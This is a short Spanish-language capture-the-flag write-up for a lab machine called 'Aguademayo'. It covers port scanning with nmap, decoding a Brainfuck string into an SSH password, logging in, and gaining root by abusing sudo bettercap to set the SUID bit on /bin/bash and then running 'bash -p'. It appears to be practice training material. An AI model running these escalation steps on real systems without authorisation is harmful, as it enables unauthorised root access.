### Maquina Aguademayo

## Puerto abiertos 

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.2

![alt text](image.png)



## Entramos en la web 

y encontramos el siguiente codigo:


++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.


usamos la herramienta en linea para desecncriptar

https://www.dcode.fr/brainfuck-language

bebeaguaqueessano

## Intrusion

nos conectamos por ssh con las credenciales agua y bebeaguaqueessano

![alt text](image-1.png)

## Escalar privilegios

sudo -l

(root) NOPASSWD: /usr/bin/bettercap

ejecutamos bettercap
sudo /usr/bin/bettercap

! chmod +s /bin/bash

Salimos de bettercap, luego, hacemos un /bin/bash -p y ya seremos usuarios root !!!

![alt text](image-2.png)